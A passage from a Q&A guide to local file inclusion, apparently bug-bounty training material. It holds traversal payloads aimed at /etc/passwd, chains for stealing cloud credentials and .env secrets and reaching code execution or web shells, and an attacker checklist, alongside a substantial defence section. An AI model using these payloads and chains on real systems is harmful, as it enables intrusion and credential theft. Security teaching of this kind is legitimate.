proxy decode mismatch:           /%2e%2e/%2e%2e/etc/passwd  ·  /..%2f..%2fetc/passwd
```

---

# REAL-WORLD PATTERNS & REFERENCES

### Q92. Recurring real-world LFI wins.
- `?page=`/`?file=`/`?template=` includes on legacy PHP → `php://filter` source/secrets → filter-chain RCE.
- Log/session poisoning on include sinks → web shell.
- `/proc/self/environ` / `.aws/credentials` / `.env` read → cloud keys → cloud takeover.
- Windows `web.config` `machineKey` → forged ViewState → RCE.
- **Apache 2.4.49/50** server traversal → file read + RCE (mass-exploited 2021).
- **nginx `alias`** off-by-slash → source disclosure.
- Second-order LFI via a stored theme/template/locale → RCE in a worker/admin tier.
- LFI + upload → web shell on "hardened" upload features.

### Q93. Resources to work through.
PortSwigger Academy → **File path traversal** and **File inclusion** labs; PayloadsAllTheThings *File Inclusion* / *Directory Traversal*; HackTricks *LFI/RFI* and *LFI2RCE*; `synacktiv/php_filter_chain_generator`; LFISuite/liffy; SecLists `Fuzzing/LFI`. Read disclosed reports tagged "LFI / path traversal / RCE".

### Q94. CWE / standards to cite.
**CWE-98** (PHP file inclusion → RCE), **CWE-22** (path traversal), **CWE-73** (external control of filename), **CWE-94** (code execution when you reach RCE), **CWE-200/CWE-538** (info/file disclosure).

---

# DEFENSE — PREVENTING LFI

### Q95. What's the secure design?
**Never pass user input to a file API.** Use a fixed **allowlist mapping** (an id → a known filename chosen server-side). If a path must be built, **canonicalize** and verify the resolved real path stays **inside** a pinned base directory (`realpath` check), and reject any `../`/encoded-variant/null byte after decoding.

### Q96. How do I kill the wrapper/RCE paths specifically?
Set **`allow_url_include=Off`** and `allow_url_fopen=Off`; **disable/restrict** dangerous wrappers (`php://`, `expect`, `phar`, `data`); store **logs and sessions outside** any inclusion path; don't pass user input to `include`/`require` at all. These remove log-poisoning, `data://`, and most filter-chain reachability.

### Q97. How do I prevent server-level traversal?
Keep Apache/nginx/IIS **patched** (Apache 2.4.49/50 → upgrade); configure nginx `alias` with a **trailing slash** (or use `root`); normalize/reject encoded traversal at the edge; disable `mod_cgi`/cgi-bin where unused; ensure the front-end and origin decode `%2e/%2f` consistently.

### Q98. How do I prevent second-order LFI?
Treat **stored** path-like values (theme/template/locale/filename) with the same allowlist+canonicalization as direct input — they're attacker-controlled too. Don't let a stored value become an `include`/file path without validation.

### Q99. Defense in depth?
Run the web user **least-privilege** with restricted filesystem access; keep secrets **out of the web root** and rotate any disclosed key; disable `phpinfo` in production; restrict outbound egress (limits cloud-metadata reach from a shell); monitor for inclusion of unexpected paths and for poisoned-log execution patterns.

### Q100. One-paragraph summary you can quote.
*"LFI is the result of letting user input choose a filesystem path — so never do that: map an id to a known file from a server-side allowlist, and if you must build a path, canonicalize it and verify the resolved real path stays inside a pinned base directory. Turn off `allow_url_include`/`allow_url_fopen`, disable the `php://`/`data`/`expect`/`phar` wrappers, and keep logs and sessions out of any inclusion path so the read can't become RCE. Patch the web server (Apache 2.4.49/50), fix nginx `alias` off-by-slash, keep secrets out of the web root, and run least-privilege. A single `?page=` that reaches the filesystem can otherwise dump your source and credentials or, via a log/wrapper/session/filter-chain, execute code — full server and cloud compromise."*

---

## APPENDIX — 60-second LFI field checklist
```
[ ] Recon every file/path sink (page/file/template/lang/download/view); grep source/JS for include/readFile/render
[ ] Baseline: read /etc/passwd (depth 1-12) ; READ vs INCLUDE? ; stack? ; forced prefix/suffix?
[ ] Reach the file: ../ depth-sweep · suffix defeat (%00 / php://filter / poison real path) · ....// / %252f · allowlist+traverse
[ ] PHP READ → php://filter dump config/.env/source/secrets (decode) ; validate creds read-only
[ ] PHP INCLUDE → RCE: log poison · session · /proc · data:// · php://input · upload+include · phpinfo race · FILTER-CHAIN (no write)
[ ] Forced .php → php://filter still reads source ; poison real on-disk paths ; filter-chain
[ ] Windows/.NET → web.config machineKey → forged ViewState RCE ; non-PHP → disclosure + SSTI pivot
[ ] Server traversal: Apache 2.4.49/50 /cgi-bin/.%2e/… (read+RCE) · nginx alias off-by-slash · proxy %2e/%2f mismatch
[ ] Second-order: stored theme/template/locale = ../../etc/passwd → trigger consumer → read/RCE (higher-priv)
[ ] Chain: env/.aws/.env creds → cloud takeover ; signing secret → JWT/ViewState forge ; +upload → web shell
[ ] Prove with a BENIGN marker (echo/id) or minimal redacted secret ; CLEAN UP ; CWE-98/22/73(+94) ; don't lead with /etc/passwd
```
*End of guide.*
